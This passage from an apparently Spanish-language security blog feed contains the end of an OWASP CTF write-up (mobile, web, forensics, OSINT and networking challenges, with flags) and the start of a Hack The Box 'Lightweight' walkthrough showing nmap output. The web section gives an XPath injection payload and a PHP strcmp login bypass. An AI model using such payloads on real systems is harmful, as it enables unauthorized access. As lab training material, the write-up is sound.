&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Error&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;no&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;flag{secret_in_the_port_is_null}&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;flag{secret_in_the_port_is_null}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;mobile&#34;&gt;MOBILE&lt;/h1&gt;
&lt;h2 id=&#34;mobile-1&#34;&gt;MOBILE&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;apktool&lt;/code&gt; para poder decompilar el archivo &lt;code&gt;Mobile1.apk&lt;/code&gt; y ver el codigo que tiene dentro. Tambien podemos utilizar &lt;a href=&#34;http://www.javadecompilers.com/&#34;&gt;http://www.javadecompilers.com/&lt;/a&gt; para el mismo fin.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/mobile1.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;La flag se encuentra en &lt;code&gt;HelloWorldActivity&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Codigo generado por javadecompilers.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kn&#34;&gt;package&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;com.example.helloworld&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;android.os.Bundle&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;com.phonegap.DroidGap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;HelloWorldActivity&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DroidGap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;onCreate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Bundle&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;savedInstanceState&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;kd&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;onCreate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;savedInstanceState&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;kd&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;loadUrl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;flag{de0fuscate_code}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;flag{de0fuscate_code}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web&#34;&gt;WEB&lt;/h1&gt;
&lt;h2 id=&#34;hide-1&#34;&gt;HIDE&lt;/h2&gt;
&lt;p&gt;Para este reto buscamos directorios comunes, tambien buscamos en el codigo fuente de las paginas. &lt;a href=&#34;http://ctf.develsecurity.com&#34;&gt;http://ctf.develsecurity.com&lt;/a&gt;:81/admin/flag.txt&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{http_directory_indexing}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;default&#34;&gt;DEFAULT&lt;/h2&gt;
&lt;p&gt;De igual forma, algunos directorios comunes. &lt;a href=&#34;http://ctf.develsecurity.com&#34;&gt;http://ctf.develsecurity.com&lt;/a&gt;:82/install/&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{default_files_installation_fake_cms}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;inject&#34;&gt;INJECT&lt;/h2&gt;
&lt;h4 id=&#34;xpath-injection&#34;&gt;XPATH INJECTION&lt;/h4&gt;
&lt;p&gt;Probamos con alguno de los payloads aqui descritos y obtuvimos la flag.&lt;/p&gt;
&lt;p&gt;Payloads: &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection&#34;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection&lt;/a&gt;&lt;br /&gt;
Payload: &lt;code&gt;x&#39; or 1=1 or &#39;x&#39;=&#39;y&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{XPATH_1NJ3CT10N}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;bypass&#34;&gt;BYPASS&lt;/h2&gt;
&lt;p&gt;Utilizamos el siguiente payload en metodo POST para obtener la bandera.&lt;/p&gt;
&lt;p&gt;Payload: &lt;code&gt;?password[]=&amp;quot;&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://ctf.develsecurity.com&#34;&gt;http://ctf.develsecurity.com&lt;/a&gt;:84/login.php?password[]=%22%22&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{bypass_strcmp_function}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;forensics&#34;&gt;FORENSICS&lt;/h1&gt;
&lt;p&gt;Para este reto revisamos todas las conexiones que se hicieron durante el volcado de memoria de este archivo, no enocontramos alguna ip que se ejecutara bajo un proceso en especifico. Asumiendo que al realizar este volcado de memoria se identifico a algun tipo de intruso en la computadora revisamos el &amp;ldquo;historial&amp;rdquo; de comandos y encontramos que antes de realizar el volcado de memoria el usuario hizo ping a una direccion que no aparece por ningun lado (sockets,socketscan,connscan,etc).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/forense_ip.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag: 192.168.21.161&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;nsazipraw&#34;&gt;NSA.ZIP[raw]&lt;/h2&gt;
&lt;p&gt;Para este reto utilizamos volatility y algunos de sus comandos para obtener las flags.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/forense_profile_nsa.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Profile: &lt;code&gt;Win7SP1x64&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;hash-ntlm&#34;&gt;HASH NTLM&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/forense_hash_nsa.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag:31d6cfe0d16ae931b73c59d7e0c089c0&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;user&#34;&gt;USER&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;flag: victim&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;pid&#34;&gt;PID&lt;/h2&gt;
&lt;p&gt;Pid del proceso &lt;code&gt;wmpnetwk.exe&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/forense_pid_nsa.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag: 2464&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;sids&#34;&gt;SIDs&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/forense_sid_nsa.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag: S-1-5-21-3480093824-3207195214-1800084707-1001&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;computer-name&#34;&gt;COMPUTER NAME&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/forense_computer_nsa.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag:VICTIM-PC&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;osint&#34;&gt;OSINT&lt;/h1&gt;
&lt;h2 id=&#34;ip-nsa&#34;&gt;IP NSA&lt;/h2&gt;
&lt;p&gt;Utilizamos algunas paginas para obtener informacion del historial de IPs de nsa.gov.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://myip.ms/&#34;&gt;https://myip.ms/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Nuestra flag: &lt;code&gt;flag{23.196.119.211}&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;196&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;119&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;211&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;United&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;States&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Akamai&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Technologies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Inc&lt;/span&gt;.  &lt;span class=&#34;m&#34;&gt;2016-08-25&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;sexy&#34;&gt;SEXY&lt;/h2&gt;
&lt;p&gt;Utilizamos Google Images para hacer una busqueda de la imagen e informacion.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/sexy.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/sexy2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag: tiffanytrump&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;stux&#34;&gt;STUX&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/stux.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag: 1096100&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;networking&#34;&gt;Networking&lt;/h1&gt;
&lt;h2 id=&#34;networking1&#34;&gt;NETWORKING1&lt;/h2&gt;
&lt;p&gt;Utilizamos Wireshark y un filtro para el puerto 21 FTP.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;tcp.port==21&lt;/li&gt;
&lt;li&gt;ftp&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/networking1.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{sn1ff1ng_ftp_cr3dent1als}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;networking2&#34;&gt;NETWORKING2&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;http.request.method == &amp;ldquo;POST&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/networking2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{http_1nsecure_commun1cat1on}&lt;/code&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/owasp/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/owasp/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>challenge</category>
            
          
            
              <category>CTF</category>
            
          
        
        
          
            
              <category>owasp</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Lightweight</title>
        <link>https://sckull.github.io/posts/lightweight/</link>
        <pubDate>Thu, 09 May 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 09 May 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/lightweight/</guid>
        <description>Lightweight es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Lightweight es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Lightweight&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Medium&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.119&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/13340&#34;&gt;0xEA31&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;En el resultado del escaneo de puertos tcp con nmap nos muestra tres puertos abiertos ssh, http y ldap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap 7.70 scan initiated Thu Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 15:20:40 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; as: nmap -sC -sV -o tcp 10.10.10.119
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.119
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 88:58:a1:cf:38💿2e:15:1d:2c:7f:72:06:a3:57:67 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp  open  http    Apache httpd 2.4.6 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;CentOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lightweight.htb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2018-06-09T13:32:51
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2019-06-09T13:32:51
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; at Thu Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 15:21:22 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; -- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 41.92 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nmap-script-ldapsearch&#34;&gt;NMAP SCRIPT: LDAPSEARCH&lt;/h2&gt;
&lt;p&gt;Utilizamos el script de nmap ldapsearch para poder obtener informacion en el puerto de ldap abierto, obtenemos informacion relacionada con usuarios, correo electronico, contraseña, etc.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap 7.70 scan initiated Thu Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 15:40:00 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; as: nmap -sC -sV -p389 --script&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ldap-search -o ldap-nmap 10.10.10.119
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.119
